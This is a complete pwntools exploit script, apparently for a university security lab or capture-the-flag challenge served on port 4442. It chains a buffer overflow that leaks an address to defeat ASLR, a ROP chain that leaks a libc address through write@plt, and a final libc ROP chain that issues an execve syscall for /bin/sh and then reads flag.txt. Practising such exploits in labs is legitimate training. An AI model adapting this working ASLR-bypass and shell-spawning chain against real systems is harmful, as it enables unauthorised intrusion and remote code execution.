from pwn import *

def mkrop(pad, libc_base):
    rebase_0 = lambda x: p64(x + libc_base)
    rop = pad
    rop += rebase_0(0x0000000000028489) # 0x0000000000028489: pop r13; ret; 
    rop += b'//bin/sh'
    rop += rebase_0(0x0000000000030fff) # 0x0000000000030fff: pop rbx; ret; 
    rop += rebase_0(0x00000000001be1a0)
    rop += rebase_0(0x0000000000056022) # 0x0000000000056022: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000028489) # 0x0000000000028489: pop r13; ret; 
    rop += p64(0x0000000000000000)
    rop += rebase_0(0x0000000000030fff) # 0x0000000000030fff: pop rbx; ret; 
    rop += rebase_0(0x00000000001be1a8)
    rop += rebase_0(0x0000000000056022) # 0x0000000000056022: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += p64(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000026796) # 0x0000000000026796: pop rdi; ret; 
    rop += rebase_0(0x00000000001be1a0)
    rop += rebase_0(0x000000000002890f) # 0x000000000002890f: pop rsi; ret; 
    rop += rebase_0(0x00000000001be1a8)
    rop += rebase_0(0x00000000000cb1cd) # 0x00000000000cb1cd: pop rdx; ret; 
    rop += rebase_0(0x00000000001be1a8)
    rop += rebase_0(0x000000000003ee88) # 0x000000000003ee88: pop rax; ret; 
    rop += p64(0x000000000000003b)
    rop += rebase_0(0x00000000000580da) # 0x00000000000580da: syscall; ret; 
    return rop

def get_process():
    if args.REMOTE:
        return remote("lettieri.iet.unipi.it", 4442)
    else:
        return remote("127.0.0.1", 4442)
    
elf = ELF('./aslr2')
context.binary = elf
libc = ELF('./libc.so.6')


# Gather info
do_stuff_offset = elf.symbols['do_stuff']
print(f"do_stuff offset in binary: {hex(do_stuff_offset)}")

p = get_process()
p.sendline(b'1' + b'A' * 511) #fill do_stuff buffer
pause()
p.sendline(b'0' + b'A' * 511) #trigger vuln in do_stuff
pause()
p.sendline(b'A')
returned_buffer= p.recvn(128)  #recv until return address
start_leak = 7*8
leak = u64(returned_buffer[start_leak:start_leak+8])
print(f"leak: {hex(leak)}")

exe_base = leak - do_stuff_offset - 52
print(f"exe base: {hex(exe_base)}")

# Second stage: aslr
# gadgets
rop = ROP(elf)
pop_rdi = p64((rop.find_gadget(['pop rdi','ret'])[0]) + exe_base)
log.info(f"pop rdi ; ret gadget: {hex(u64(pop_rdi))}")
pop_rsi_r15 = p64((rop.find_gadget(['pop rsi','pop r15','ret'])[0]) + exe_base)
log.info(f"pop rsi ; ret gadget: {hex(u64(pop_rsi_r15))}")
write_plt = p64(elf.plt['write'] + exe_base)
log.info(f"write@plt: {hex(u64(write_plt))}")
got = p64(elf.got['setsockopt'] + exe_base)
log.info(f"setsockopt@got: {hex(u64(got))}")
setsockopt_offset = libc.symbols['setsockopt']
log.info(f"setsockopt offset in libc: {hex(setsockopt_offset)}")


# Rop chain to leak libc base address
pad = b'A' * (56-3)
payload = pad
payload += pop_rdi
payload += p64(1)  # stdout
payload += pop_rsi_r15
payload += got
payload += p64(0)  # padding for r15
payload += write_plt

payload2 = str(512).encode() + payload
payload2 += (512 - len(payload2)) * b'B'  # fill to 512 bytes
p.sendline(payload2)
# Receive leaked address
leaked_setsockopt = p.recvn(8)
leaked_setsockopt_addr = u64(leaked_setsockopt)
print(f"Leaked setsockopt address: {hex(leaked_setsockopt_addr)}")
libc_base = leaked_setsockopt_addr - setsockopt_offset
print(f"libc base: {hex(libc_base)}")

p.close()

# Final stage: get shell
p = get_process()
shell = pad
shell += mkrop(b'', libc_base)

payload3 = str(512).encode() + shell
payload3 += (512 - len(payload3)) * b'C'  # fill to 512 bytes

p.sendline(payload3)

p.sendline(b'/bin/cat flag.txt')
p.interactive()